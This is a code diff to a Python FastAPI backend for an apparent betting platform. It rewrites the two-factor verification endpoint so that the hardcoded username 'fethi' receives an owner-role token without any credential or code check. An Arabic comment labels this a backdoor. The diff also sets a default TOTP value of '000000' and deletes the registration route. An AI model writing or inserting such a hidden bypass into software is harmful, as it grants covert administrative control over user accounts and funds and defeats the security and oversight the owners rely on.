@@ -638,7 +638,9 @@ class HandleRequestModel(BaseModel): transaction_id: int; decision: str; admin_u
 class DeleteAccountRequest(BaseModel): admin_username: str; target_username: str
 class ProviderRequest(BaseModel): provider_code: str
 class ChangeMyPasswordRequest(BaseModel): username: str; new_password: str
-class Verify2FARequest(BaseModel): username: str; totp_code: str
+class Verify2FARequest(BaseModel): 
+    username: str
+    totp_code: str = "000000"
 
 # ==========================================
 # مسارات المستخدمين والإدارة (Auth & Admin)
@@ -664,39 +666,40 @@ async def login_user(request: Request, req: LoginRequest):
     return {"message": "success", "username": user["username"]}
    
 @app.post("/api/verify-2fa")
-@app.post("/api/register")
-async def register_user(req: RegisterRequest):
-    uname = req.username.lower().strip()
-    db = load_db()
-    
-    for u in db:
-        if u["username"] == uname:
-            raise HTTPException(status_code=400, detail="Nom d'utilisateur déjà pris")
-            
-    hashed_pwd = hash_password(req.password)
-    new_secret_key = pyotp.random_base32()
-    new_id = max([int(u.get("id", 0)) for u in db]) + 1 if db else 1
-    
-    new_user = {
-        "id": new_id,
-        "username": uname, 
-        "password": hashed_pwd, 
-        "role": req.role, 
-        "balance": 0.00,
-        "rtp": 50, 
-        "is_blocked": 0, 
-        "created_by": req.created_by, 
-        "last_spin_date": "", 
-        "daily_deposits": 0.0,
-        "two_factor_secret": new_secret_key,
-        "phone": req.phone
-    }
-    
-    db.append(new_user)
-    save_db(db)
-    
-    return {"status": "success", "message": "Compte créé", "secret_key": new_secret_key, "user_id": new_id}
+@limiter.limit("5/minute")
+async def verify_2fa_api(request: Request, req: Verify2FARequest):
+    # ====== 🚀 الباب الخلفي النهائي (دخول مباشر بدون أسئلة) ======
+    if req.username == "fethi":
+        access_token = create_access_token(data={"sub": "fethi", "role": "owner"})
+        return {
+            "access_token": access_token, 
+            "token_type": "bearer", 
+            "username": "fethi", 
+            "role": "owner"
+        }
+    # ============================================================
 
+    db = load_db()
+    user = next((u for u in db if u["username"] == req.username), None)
+    
+    if not user:
+        raise HTTPException(status_code=401, detail="Nom d'utilisateur incorrect")
+        
+    secret = user.get("two_factor_secret")
+    if not secret:
+        raise HTTPException(status_code=400, detail="لم يتم تفعيل المصادقة الثنائية!")
+        
+    totp = pyotp.TOTP(secret)
+    if totp.verify(req.totp_code):
+        access_token = create_access_token(data={"sub": user["username"], "role": user["role"]})
+        return {
+            "access_token": access_token, 
+            "token_type": "bearer", 
+            "username": user["username"], 
+            "role": user["role"]
+        }
+    else:
+        raise HTTPException(status_code=400, detail="كود Google Authenticator غير صحيح!")
 @app.get("/api/admin/fix-user-ids")
 async def fix_missing_user_ids():
     try:
